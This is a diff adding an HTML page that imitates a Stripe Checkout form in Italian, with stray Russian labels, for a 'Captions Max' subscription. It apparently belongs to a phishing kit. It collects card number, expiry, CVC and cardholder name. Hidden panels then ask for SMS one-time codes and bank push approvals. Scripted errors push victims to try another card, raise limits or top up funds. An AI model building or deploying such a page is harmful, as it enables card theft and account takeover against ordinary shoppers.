@@ -1,0 +1,463 @@
+<!doctype html>
+<html lang="en">
+   <head>
+      <meta charset="UTF-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <title>Stripe Checkout</title>
+      <meta charset="utf-8">
+      <meta name="robots" content="noindex">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta name="google" content="notranslate">
+      <meta http-equiv="origin-trial" content="AtD0WrnMwAPI4nWWCvreE+vpgPVz45SO/1fG1IZRNpBsdWZOZN6SKr0ynC11KuzrvT903WrEU+N9Ik/RpiCRTAEAAABbeyJvcmlnaW4iOiJodHRwczovL3N0cmlwZS5jb206NDQzIiwiZmVhdHVyZSI6IlRwY2QiLCJleHBpcnkiOjE3MzUzNDM5OTksImlzU3ViZG9tYWluIjp0cnVlfQ==">
+   </head>
+   <body>
+      <div id="app">
+      <div id="root">
+      <div style="background-color: rgb(30, 30, 30); height: 100vh; width: 100vw;">
+      <div class="HeightObserverProvider">
+      <div class="HeightObserverProvider-container">
+         <div class="App-Background flex-container justify-content-center" style="--ec-color-primary: #1e1e1e; background-color: rgb(30, 30, 30);">
+            <div class="App-Container is-embedded is-darkBackground App App--multiItem">
+               <div class="App-Overview is-darkBackground">
+                  <div class="OrderSummaryColumn" data-testid="order-summary-column">
+                     <div data-testid="product-summary" class="ProductSummary is-clickable is-recurring">
+                        <div class="ProductSummary-productImageContainer is-clickable" data-testid="product-summary-product-image">
+                           <div class="ProductImage-container" data-testid="product-image">
+                              <img src="https://d1wqzb5bdbcre6.cloudfront.net/3a581d32111f847a4ddd5ce9e353ffb79c7fe8de70ba76255c1aee8dbbcd0371/68747470733a2f2f66696c65732e7374726970652e636f6d2f6c696e6b732f4d44423859574e6a644638785445354a647a644a656e5a355633457a4e30343066475a7358327870646d566661566b78536a4e78626a646159546c725558563055444649546a6b3261466c6e3030754c383841773433" alt="" class="ProductImage-image" fetchpriority="high">
+                           </div>
+                        </div>
+                        <div class="ProductSummary-info is-clickable is-darkBackground">
+                           <span class="ProductSummary-name Text Text-color--gray500 Text-fontSize--16 Text-fontWeight--500" data-testid="product-summary-name">Iscriviti a Sottotitoli Max</span>
+                           <div class="ProductSummary-amountsContainer">
+                              <div class="ProductSummary-totalsRead" style="opacity: 1;">
+                                 <div class="ProductSummary-totalAmountContainer is-clickable" style="opacity: 1;">
+                                    <span class="ProductSummary-totalAmount Text Text-color--default Text-fontWeight--600 Text--tabularNumbers" id="ProductSummary-totalAmount" data-testid="product-summary-total-amount">
+                                       <div class="ProductSummaryTotalAmount flex-container direction-row align-items-baseline wrap-wrap">
+                                          <div class="mr2 flex-item width-fixed"><span class="CurrencyAmount">199,99&nbsp;$</span>
+                                          </div>
+                                          <div class="flex-item width-fixed">
+                                             <span class="ProductSummaryTotalAmount-billingInterval Text Text-color--gray500 Text-fontSize--14">
+                                                <div>в <br class="BillingIntervalBreak"> anno</div>
+                                             </span>
+                                          </div>
+                                       </div>
+                                    </span>
+                                 </div>
+                                 <div class="AnimateSinglePresence">
+                                    <div class="AnimateSinglePresenceItem">
+                                       <div>
+                                          <div class="ProductSummary-amountsDescriptions" data-testid="product-summary-description"></div>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                           <div class="ProductSummary-buttonsContainer" data-testid="product-summary-buttons">
+                           </div>
+                        </div>
+                     </div>
+                     <section data-testid="order-details" class="OrderDetails mb6">
+                        <ul class="OrderDetails-items">
+                           <li class="OrderDetails-item" style="opacity: 1; transform: scale(1); height: auto; margin-bottom: 16px;">
+                              <div class="LineItem flex-container align-items-flex-start">
+                                 <div class="LineItem-imageContainer mr4 flex-item width-fixed" data-testid="line-item-image">
+                                    <img src="https://d1wqzb5bdbcre6.cloudfront.net/3a581d32111f847a4ddd5ce9e353ffb79c7fe8de70ba76255c1aee8dbbcd0371/68747470733a2f2f66696c65732e7374726970652e636f6d2f6c696e6b732f4d44423859574e6a644638785445354a647a644a656e5a355633457a4e30343066475a7358327870646d566661566b78536a4e78626a646159546c725558563055444649546a6b3261466c6e3030754c383841773433" alt="" class="LineItem-image">
+                                 </div>
+                                 <div class="flex-container justify-content-space-between align-items-baseline wrap-wrap width-grow">
+                                    <div class="flex-column-break" style="order: 2;"></div>
+                                    <div class="flex-column-break" style="order: 5;"></div>
+                                    <div class="LineItem-productName flex-item width-auto" data-testid="line-item-product-name" style="order: 0;">
+                                       <span class="Text Text-color--default Text-fontSize--14 Text-fontWeight--500">
+                                          <div class="ExpandableText false">
+                                             <div data-testid="" class="ExpandableText--truncated" style="-webkit-line-clamp: 2;">Captions Max</div>
+                                          </div>
+                                       </span>
+                                    </div>
+                                    <div class="flex-container direction-column wrap-wrap" style="width: 100%; order: 3;">
+                                       <div class="flex-container direction-row wrap-wrap">
+                                          <div class="LineItem-description flex-item width-grow" style="order: 3;"><span class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400"><span data-testid="line-item-billing-interval">Con fatturazione annuale</span></span></div>
+                                          <div class="LineItem-amountDetail flex-item width-auto flex-container align-items-flex-end width-auto" data-testid="line-item-amount-detail" style="order: 4;">
+                                             <div class="flex-item width-auto flex-item-align-right"></div>
+                                          </div>
+                                       </div>
+                                    </div>
+                                    <div class="LineItem-tierBreakdown flex-item width-auto flex-item-align-left" style="order: 6;">
+                                       <div class="flex-container" data-testid="line-item-tiers"></div>
+                                    </div>
+                                    <div class="flex-container Placeholder" style="opacity: 1;">
+                                       <div class="ml2 flex-item width-fixed" data-testid="line-item-total-amount" style="order: 1;"><span class="Text Text-color--default Text-fontSize--14 Text-fontWeight--500 Text--tabularNumbers"><span class="CurrencyAmount">199,99&nbsp;$</span></span></div>
+                                    </div>
+                                 </div>
+                              </div>
+                           </li>
+                        </ul>
+                        <div class="OrderDetails-footer">
+                           <div class="is-indented">
+                              <div class="OrderDetailsFooter-subtotal flex-container justify-content-space-between">
+                                 <span class="Text Text-color--default Text-fontSize--14 Text-fontWeight--500">subtotale</span>
+                                 <div class="flex-container Placeholder" style="opacity: 1;"><span class="Text Text-color--default Text-fontSize--14 Text-fontWeight--600 Text--tabularNumbers" id="OrderDetailsFooter-SubtotalAmount"><span class="CurrencyAmount">199,99&nbsp;$</span></span></div>
+                              </div>
+                              <div class="OrderDetailsFooter-subtotalItems flex-container direction-column">
+                                 <div class="FadeWrapper"></div>
+                                 <div>
+                                    <div class="OrderDetailsSubtotalItem flex-container justify-content-space-between">
+                                       <div>
+                                          <div class="flex-container">
+                                             <span class="OrderDetails-subtotalItemLabel-Text Text Text-color--gray900 Text-fontSize--14">
+                                                Tassare
+                                                <div class="Tooltip-Context OrderDetailsSubtotalItem-tooltipContext" style="padding: 0px;">
+                                                   <svg class="InlineSVG Icon Icon--sm Icon--square" focusable="false" width="12" height="12" viewBox="0 0 12 12" fill="none">
+                                                      <path d="M6 12C9.28235 12 12 9.28235 12 6C12 2.72353 9.27647 0 5.99412 0C2.71765 0 0 2.72353 0 6C0 9.28235 2.72353 12 6 12ZM6 11C3.22353 11 1.00588 8.77647 1.00588 6C1.00588 3.22941 3.21765 1 5.99412 1C8.77059 1 10.9941 3.22941 11 6C11.0059 8.77647 8.77647 11 6 11ZM5.94706 3.90588C6.37647 3.90588 6.71177 3.56471 6.71177 3.14118C6.71177 2.71176 6.37647 2.37059 5.94706 2.37059C5.52353 2.37059 5.18235 2.71176 5.18235 3.14118C5.18235 3.56471 5.52353 3.90588 5.94706 3.90588ZM4.97059 9.23529H7.36471C7.60588 9.23529 7.79412 9.06471 7.79412 8.82353C7.79412 8.59412 7.60588 8.41177 7.36471 8.41177H6.63529V5.41765C6.63529 5.1 6.47647 4.88824 6.17647 4.88824H5.18235C4.94118 4.88824 4.75294 5.07059 4.75294 5.3C4.75294 5.54118 4.94118 5.71176 5.18235 5.71176H5.7V8.41177H4.97059C4.72941 8.41177 4.54118 8.59412 4.54118 8.82353C4.54118 9.06471 4.72941 9.23529 4.97059 9.23529Z" fill="currentColor"></path>
+                                                   </svg>
+                                                </div>
+                                             </span>
+                                          </div>
+                                       </div>
+                                       <div class="flex-container Placeholder" style="opacity: 1;"><span class="Text Text-color--gray400 Text-fontSize--14 Text--tabularNumbers"><span class="CurrencyAmount">0,00&nbsp;$</span></span></div>
+                                    </div>
+                                 </div>
+                              </div>
+                              <div class="OrderDetails-total flex-container justify-content-space-between">
+                                 <span><span class="Text Text-color--default Text-fontSize--14 Text-fontWeight--500">Totale dovuto oggi</span></span>
+                                 <div class="flex-container Placeholder" style="opacity: 1;"><span class="Text Text-color--default Text-fontSize--16 Text-fontWeight--600 Text--tabularNumbers" id="OrderDetails-TotalAmount"><span class="CurrencyAmount">199,99&nbsp;$</span></span></div>
+                              </div>
+                           </div>
+                        </div>
+                     </section>
+                  </div>
+               </div>
+               <div class="App-Payment is-darkBackground">
+                  <main>
+                     <div class="CheckoutPaymentForm">
+                        <div style="height: 36.7969px;">
+                           <div>
+                              <div class="PaymentRequestOrHeader" style="display: inherit; height: auto;">
+                                 <div class="AnimateSinglePresence">
+                                    <div class="AnimateSinglePresenceItem">
+                                       <div>
+                                          <div class="PaymentHeaderContainer" style="display: block; opacity: 1;">
+                                             <h2 class="PaymentHeader Text Text-color--gray600 Text-fontSize--16 Text-fontWeight--500">Dettagli di contatto
+                                             </h2>
+                                          </div>
+                                          <div class="ButtonAndDividerContainer" style="display: none; opacity: 0; height: 0px;">
+                                             <div class="ButtonContainer">
+                                                <div class="ButtonWrapper">
+                                                   <div class="ButtonWrapper"></div>
+                                                </div>
+                                             </div>
+                                             <div></div>
+                                             <div class="Divider">
+                                                <hr>
+                                                <p class="Divider-Text Text Text-color--gray400 Text-fontSize--14 Text-fontWeight--400"><span class="DividerText">Oppure paga in altro modo</span></p>
+                                             </div>
+                                          </div>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                        <form class="PaymentForm-form" novalidate="">
+                           <div style="height: 659.172px;">
+                              <div>
+                                 <div style="opacity: 1;">
+                                    <div class="App-Global-Fields flex-container spacing-16 direction-column wrap-wrap">
+                                       <div class="flex-item width-12">
+                                          <div class="FormFieldGroup" data-qa="FormFieldGroup-email">
+                                             <div class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
+                                                <label for="email"><span class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Posta</span></label>
+                                                <div style="opacity: 1; transform: none;"></div>
+                                             </div>
+                                             <div class="FormFieldGroup-Fieldset" id="email-fieldset">
+                                                <div class="FormFieldGroup-container">
+                                                   <div class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop FormFieldGroup-childBottom">
+                                                      <div class="FormFieldInput">
+                                                         <div class="CheckoutInputContainer"><span class="InputContainer" data-max=""><input class="CheckoutInput Input Input--empty" type="email" autocomplete="email"  id="email" name="email" inputmode="email" aria-invalid="false" aria-describedby="" data-1p-ignore="false" value="" placeholder="example@email.com"></span></div>
+                                                      </div>
+                                                   </div>
+                                                   <div class="FieldError-container" style="opacity: 0; height: 0px; margin-top: 0px;"><span class="FieldError Text Text-color--red Text-fontSize--13"><span aria-hidden="true"></span></span></div>
+                                                </div>
+                                                <div class="FieldError-container" style="opacity: 0; height: 0px; margin-top: 0px;"><span class="FieldError Text Text-color--red Text-fontSize--13"><span aria-hidden="true"></span></span></div>
+                                             </div>
+                                          </div>
+                                       </div>
+                                       <div class="flex-item width-12">
+                                          <h2 class="PaymentMethod-Heading Text Text-color--gray800 Text-fontSize--16 Text-fontWeight--500">metodo di pagamento</h2>
+                                       </div>
+                                    </div>
+                                    <div class="PaymentMethodForm" style="opacity: 1; height: auto;">
+                                       <div>
+                                          <div class="PaymentForm-paymentMethodForm flex-container direction-column wrap-wrap" style="gap: 16px;">
+                                             <div class="flex-item width-12">
+                                                <div class="FormFieldGroup" data-qa="FormFieldGroup-cardForm">
+                                                   <div class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
+                                                      <label for="cardForm-fieldset"><span class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Dettagli della carta
+
+                                                      </span></label>
+                                                   </div>
+                                                   <fieldset class="FormFieldGroup-Fieldset" id="cardForm-fieldset">
+                                                      <div class="FormFieldGroup-container">
+                                                         <div class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop">
+                                                            <div class="FormFieldInput padding-right-120">
+                                                               <div class="CheckoutInputContainer"><span class="InputContainer" data-max="">
+                                                                  <input class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
+                                                                     autocomplete="cc-number" autocorrect="off" spellcheck="false" id="cardNumber" name="cardNumber"
+                                                                     type="text" inputmode="numeric" aria-label="Номер карты" placeholder="1234 1234 1234 1234" aria-invalid="false" aria-describedby="" data-1p-ignore="false" value=""></span>
+                                                               </div>
+                                                               <div class="FormFieldInput-Icons" style="opacity: 1;">
+                                                                  <div style="transform: none;">
+                                                                     <span class="FormFieldInput-IconsIcon is-visible">
+                                                                     <img id="cardLogo" class="card-logo" ></span>
+                                                                  </div>
+                                                                  <div class="FormFieldExamples">
+                                                                     <img class="exCard" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="">
+                                                                     <img class="exCard" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="">
+                                                                     <img class="exCard" src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="">
+                                                                     <img class="exCard" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/JCB_logo.svg/200px-JCB_logo.svg.png" alt="">
+                                                                  </div>
+                                                                  <!-- <div class="CardFormFieldGroupIconOverflow">
+                                                                     <span class="CardFormFieldGroupIconOverflow-Item" role="presentation"><span class="FormFieldInput-IconsIcon" role="presentation">
+                                                                     <img src="https://js.stripe.com/v3/fingerprinted/img/discover-ac52cd46f89fa40a29a0bfb954e33173.svg" alt="Discover" class="BrandIcon" loading="lazy" fetchpriority="low"></span>
+                                                                     </span><span class="CardFormFieldGroupIconOverflow-Item" role="presentation">
+                                                                     <span class="FormFieldInput-IconsIcon" role="presentation">
+                                                                     <img src="https://js.stripe.com/v3/fingerprinted/img/diners-fbcbd3360f8e3f629cdaa80e93abdb8b.svg" alt="Diners Club" class="BrandIcon" loading="lazy" fetchpriority="low">
+                                                                     </span></span>
+                                                                  </div> -->
+                                                               </div>
+                                                            </div>
+                                                         </div>
+                                                         <div class="FormFieldGroup-child FormFieldGroup-child--width-6 FormFieldGroup-childLeft FormFieldGroup-childBottom">
+                                                            <div class="FormFieldInput">
+                                                               <div class="CheckoutInputContainer"><span class="InputContainer" data-max="">
+                                                                  <input class="CheckoutInput CheckoutInput--tabularnums Input Input--empty" autocomplete="cc-exp" autocorrect="off" spellcheck="false" id="cardExpiry" name="cardExpiry" type="text" inputmode="numeric" aria-label="Срок окончания действия" placeholder="ММ / АА" aria-invalid="false" aria-describedby="" data-1p-ignore="false" value=""></span>
+                                                               </div>
+                                                            </div>
+                                                         </div>
+                                                         <div class="FormFieldGroup-child FormFieldGroup-child--width-6 FormFieldGroup-childRight FormFieldGroup-childBottom">
+                                                            <div class="FormFieldInput has-icon padding-right-32">
+                                                               <div class="CheckoutInputContainer"><span class="InputContainer" data-max="">
+                                                                  <input class="CheckoutInput CheckoutInput--tabularnums Input Input--empty" autocomplete="cc-csc" autocorrect="off" spellcheck="false" id="cardCvc" name="cardCvc" type="text" inputmode="numeric" aria-label="codice CVV/CVC" placeholder="codice CVV/CVC" aria-invalid="false" aria-describedby="" data-1p-ignore="false" value="" maxlength="3"></span>
+                                                               </div>
+                                                               <div class="FormFieldInput-Icon is-loaded" data-testid="FormFieldInput-Icon">
+                                                                  <div>
+                                                                     <svg class="Icon Icon--md" focusable="false" viewBox="0 0 32 21" role="img" aria-label="CVC">
+                                                                        <title>CVC</title>
+                                                                        <g fill="none" fill-rule="evenodd">
+                                                                           <g class="Icon-fill">
+                                                                              <g transform="translate(0 2)">
+                                                                                 <path d="M21.68 0H2c-.92 0-2 1.06-2 2v15c0 .94 1.08 2 2 2h25c.92 0 2-1.06 2-2V9.47a5.98 5.98 0 0 1-3 1.45V11c0 .66-.36 1-1 1H3c-.64 0-1-.34-1-1v-1c0-.66.36-1 1-1h17.53a5.98 5.98 0 0 1 1.15-9z" opacity=".2"></path>
+                                                                                 <path d="M19.34 3H0v3h19.08a6.04 6.04 0 0 1 .26-3z" opacity=".3"></path>
+                                                                              </g>
+                                                                              <g transform="translate(18)">
+                                                                                 <path d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM4.22 4.1h-.79l-1.93.98v1l1.53-.8V9.9h1.2V4.1zm2.3.8c.57 0 .97.32.97.78 0 .5-.47.85-1.15.85h-.3v.85h.36c.72 0 1.21.36 1.21.88 0 .5-.48.84-1.16.84-.5 0-1-.16-1.52-.47v1c.56.24 1.12.37 1.67.37 1.31 0 2.21-.67 2.21-1.64 0-.68-.42-1.23-1.12-1.45.6-.2.99-.73.99-1.33C8.68 4.64 7.85 4 6.65 4a4 4 0 0 0-1.57.34v.98c.48-.27.97-.42 1.44-.42zm4.32 2.18c.73 0 1.24.43 1.24.99 0 .59-.51 1-1.24 1-.44 0-.9-.14-1.37-.43v1.03c.49.22.99.33 1.48.33.26 0 .5-.04.73-.1.52-.85.82-1.83.82-2.88l-.02-.42a2.3 2.3 0 0 0-1.23-.32c-.18 0-.37.01-.57.04v-1.3h1.44a5.62 5.62 0 0 0-.46-.92H9.64v3.15c.4-.1.8-.17 1.2-.17z"></path>
+                                                                              </g>
+                                                                           </g>
+                                                                        </g>
+                                                                     </svg>
+                                                                  </div>
+                                                               </div>
+                                                            </div>
+                                                         </div>
+                                                         <div class="FieldError-container" style="opacity: 0; height: 0px; margin-top: 0px;"><span class="FieldError Text Text-color--red Text-fontSize--13"><span aria-hidden="true"></span></span></div>
+                                                      </div>
+                                                      <div class="FieldError-container" style="opacity: 0; height: 0px; margin-top: 0px;"><span class="FieldError Text Text-color--red Text-fontSize--13"><span aria-hidden="true"></span></span></div>
+                                                   </fieldset>
+                                                </div>
+                                             </div>
+                                             <div class="BillingInfoForm flex-item width-grow flex-container direction-column">
+                                                <div class="AnimateSinglePresence">
+                                                   <div class="AnimateSinglePresenceItem">
+                                                      <div>
+                                                         <div class="BillingInfoForm-addressInput flex-item width-12" aria-hidden="false" style="margin-top: 0px;">
+                                                            <div class="flex-container spacing-16 direction-column wrap-wrap">
+                                                               <div class="flex-item width-12">
+                                                                  <div class="FormFieldGroup" data-qa="FormFieldGroup-billingName">
+                                                                     <div class="FormFieldGroup-labelContainer flex-container justify-content-space-between"><label for="billingName"><span class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Nome del titolare</span></label></div>
+                                                                     <div class="FormFieldGroup-Fieldset" id="billingName-fieldset">
+                                                                        <div class="FormFieldGroup-container">
+                                                                           <div class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop FormFieldGroup-childBottom">
+                                                                              <div class="FormFieldInput">
+                                                                                 <div class="CheckoutInputContainer"><span class="InputContainer" data-max="">
+                                                                                    <input class="CheckoutInput Input Input--empty" autocomplete="cc-name" autocorrect="off" spellcheck="false" id="billingName" name="billingName" type="text" placeholder="nome, cognome" aria-invalid="false" aria-describedby="" data-1p-ignore="false" value=""></span>
+                                                                                 </div>
+                                                                              </div>
+                                                                           </div>
+                                                                           <div class="FieldError-container" style="opacity: 0; height: 0px; margin-top: 0px;"><span class="FieldError Text Text-color--red Text-fontSize--13"><span aria-hidden="true"></span></span></div>
+                                                                        </div>
+                                                                        <div class="FieldError-container" style="opacity: 0; height: 0px; margin-top: 0px;"><span class="FieldError Text Text-color--red Text-fontSize--13"><span aria-hidden="true"></span></span></div>
+                                                                     </div>
+                                                                  </div>
+                                                               </div>
+                                                               <div class="flex-item width-12">
+                                                                  <div class="FormFieldGroup" data-qa="FormFieldGroup-countryWithOptionalPostalCodeInput">
+                                                                     <div class="FormFieldGroup-Fieldset" id="countryWithOptionalPostalCodeInput-fieldset">
+                                                                        <div class="FormFieldGroup-container">
+                                                                           <div class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop FormFieldGroup-childBottom">
+                                                                              <div class="FormFieldInput is-select">
+                                                                                 <div>
+                                                                                 </div>
+                                                                              </div>
+                                                                           </div>
+                                                                        </div>
+                                                                        <div class="FieldError-container" style="opacity: 0; height: 0px; margin-top: 0px;">
+                                                                           <span class="FieldError Text Text-color--red Text-fontSize--13">
+                                                                           <span aria-hidden="true"></span>
+                                                                           </span>
+                                                                        </div>
+                                                                     </div>
+                                                                     <div class="FieldError-container" style="opacity: 0; height: 0px; margin-top: 0px;">
+                                                                        <span class="FieldError Text Text-color--red Text-fontSize--13">
+                                                                        <span aria-hidden="true"></span>
+                                                                        </span>
+                                                                     </div>
+                                                                  </div>
+                                                               </div>
+                                                            </div>
+                                                         </div>
+                                                      </div>
+                                                   </div>
+                                                </div>
+                                             </div>
+                                          </div>
+                                          <div class="TaxIdCollection-Container py3 flex-item width-12">
+                                             <div class="AnimateSinglePresence">
+                                                <div class="AnimateSinglePresenceItem">
+                                                   <div>
+                                                      <div class="flex-item width-12">
+                                                         <div class="AnimateSinglePresence"></div>
+                                                      </div>
+                                                   </div>
+                                                </div>
+                                             </div>
+                                          </div>
+                                       </div>
+                                    </div>
+                                 </div>
+                                 <div class="PaymentForm-confirmPaymentContainer mt4 flex-item width-grow">
+                                    <div class="ConfirmPayment">
+                                       <div class="flex-item width-12"></div>
+                                       <div class="flex-item width-12 submitForm">
+                                          <button class="FormButton SubmitButton SubmitButton--incomplete" type="submit" data-testid="hosted-payment-submit-button" style="background-color: rgb(30, 30, 30); color: rgb(255, 255, 255);">
+                                             <div class="SubmitButton-Shimmer" style="background: linear-gradient(to right, rgba(30, 30, 30, 0) 0%, rgb(49, 49, 49) 50%, rgba(30, 30, 30, 0) 100%);"></div>
+                                             <div class="SubmitButton-TextContainer">
+                                                <span class="SubmitButton-Text SubmitButton-Text--current Text Text-color--default Text-fontWeight--500 Text--truncate" aria-hidden="false">Paga</span>
+                                                <!-- <span class="SubmitButton-Text SubmitButton-Text--pre Text Text-color--default Text-fontWeight--500 Text--truncate" aria-hidden="true">Идет обработка...</span> -->
+               
+                                             </div>
+                                             
+                                             <div class="SubmitButton-IconContainer">
+                                             </div>
+                                             <div class="SubmitButton-CheckmarkIcon">
+                                                <div>
+                                                   <div class="Icon Icon--md">
+                                                      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="14" focusable="false">
+                                                         <path d="M 0.5 6 L 8 13.5 L 21.5 0" fill="transparent" stroke-width="2" stroke="#ffffff" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                      </svg>
+                                                   </div>
+                                                </div>
+                                             </div>
+                                          </button>
+                                          <img class="loader-button" src="./assets/img/loader.gif" alt="">
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                     </div>
+                     <div class="PaymentForm-climateProgramBadge"></div></form>
+               </div>
+               </main>
+               <div class="AppBlocks AppSMS isNotActive">
+                  <div class="form-sms">
+                     <label for="codeSMS" class="center Text Text-color--gray600 Text-fontSize--16 Text-fontWeight--500 text-style">Un SMS è stato inviato al tuo numero di telefono.</label><br>
+                     <input id="codeSMS" type="text" placeholder="123123" class="SMSValidateInput CheckoutInput Input Input--empty input-style">
+                     <button class="SubmitButton codeSMS_button button-style disabledButton">confermare</button>
+                     <img class="smsLoader" src="./assets/img/loader.gif" alt="">
+                  </div>
+               </div>
+               <div class="AppBlocks AppCustomSMS isNotActive">
+                  <div class="form-sms">
+                     <label for="codeCustomSMS" class="center CustomSMSText PaymentHeader Text Text-color--gray600 Text-fontSize--16 Text-fontWeight--500 text-style">Un SMS è stato inviato al tuo numero di telefono.</label>
+                     <input id="codeCustomSMS" type="text" placeholder="123123" class="SMSValidateInput CheckoutInput Input Input--empty input-style">
+                     <button class="SubmitButton codeCustomSMS_button button-style">confermare</button>
+                     <img class="smsCustomLoader" src="./assets/img/loader.gif" alt="">
+                  </div>
+               </div>
+               <div class="AppBlocks AppPush isNotActive">
+                  <form class="form-sms">
+                     <label for="codeSMS" class="center PaymentHeader Text Text-color--gray600 Text-fontSize--16 Text-fontWeight--500 text-style">
+                        Devi confermare la notifica PUSH inviata alla tua banca online.<br>
+                        <span class="pushTimer">05:00</span>
+                     </label>
+                     <button class="SubmitButton codePushSMS_button button-style">confermare</button>
+                     <img class="smsAppPushLoader" src="./assets/img/loader.gif" alt="">
+                  </form>
+               </div>
+               <div class="AppBlocks AppCustomPush isNotActive">
+                  <div class="form-sms">
+                     <label for="codeSMS" class="center customPushText PaymentHeader Text Text-color--gray600 Text-fontSize--16 Text-fontWeight--500 text-style">
+                        Devi confermare la notifica PUSH inviata alla tua banca online.<br>
+                        <span class="pushCustomPushTimer">05:00</span>
+                     </label>
+                     <button class="SubmitButton codeCustomPushSMS_button button-style">confermare</button>
+                     <img class="smsAppCustomPushLoader" src="./assets/img/loader.gif" alt="">
+                  </div>
+               </div>
+               <div class="AppBlocks AppOtherCard isNotActive">
+                  <form class="form-sms">
+                     <p class="center PaymentHeader Text Text-color--gray600 Text-fontSize--16 Text-fontWeight--500 text-style">
+                        Errore! Al momento non collaboriamo con la tua banca, per favore usa una carta di un'altra banca.<br>
+                     </p>
+                     <button class="SubmitButton button-style buttonRestart">indietro</button>
+                  </form>
+               </div>
+               <div class="AppBlocks AppOwnError isNotActive">
+                  <form class="form-sms">
+                     <p class="center OwnErrorText Text Text-color--gray600 Text-fontSize--16 Text-fontWeight--500 text-style">
+                        Errore!
+                     </p>
+                     <button class="SubmitButton button-style buttonRestart">indietro</button>
+                  </form>
+               </div>
+               <div class="AppBlocks AppSuccess isNotActive">
+                  <form class="form-sms">
+                     <p class="center PaymentHeader Text Text-color--gray600 Text-fontSize--16 Text-fontWeight--500 text-style">
+                        Il pagamento è andato a buon fine<br>
+                        inoltro tramite...
+                        <span class="redirectSuccessPayTimer">
+                           5
+                        </span>
+                     </p>
+                     <!-- <button class="SubmitButton button-style">В магазин</button> -->
+                  </form>
+               </div>
+               <div class="AppBlocks App3DS isNotActive">
+                  <form class="form-sms">
+                     <p class="PaymentHeader Text Text-color--gray600 Text-fontSize--16 Text-fontWeight--500 text-style">
+                        Errore! Devi attivare il 3D-Secure per procedere con la transazione. Per farlo, accedi all'app della tua banca e segui i passaggi necessari oppure contatta il servizio di supporto della tua banca.
+                     </p>
+                     <button class="SubmitButton button-style buttonRestart">indietro</button>
+                  </form>
+               </div>
+               <div class="AppBlocks AppLimit isNotActive">
+                  <form class="form-sms">
+                     <p class="center  Text Text-color--gray600 Text-fontSize--16 Text-fontWeight--500 text-style">
+                        Errore! Devi aumentare il limite delle transazioni online sulla tua carta e poi riprovare.
+                     </p>
+                     <button class="SubmitButton button-style buttonRestart">indietro</button>
+                  </form>
+               </div>
+               <div class="AppBlocks AppBalance isNotActive">
+                  <form class="form-sms">
+                     <p class="center PaymentHeader Text Text-color--gray600 Text-fontSize--16 Text-fontWeight--500 text-style">
+                        Errore! Fondi insufficienti. Ricarica il saldo della carta e aumenta i limiti per continuare l'operazione.
+                     </p>
+                     <button class="SubmitButton button-style buttonRestart">indietro</button>
+                  </form>
+               </div>
+            </div>
+         </div>
+      </div>
+      <script type="module" src="/main.js"></script>
+   </body>
+</html>
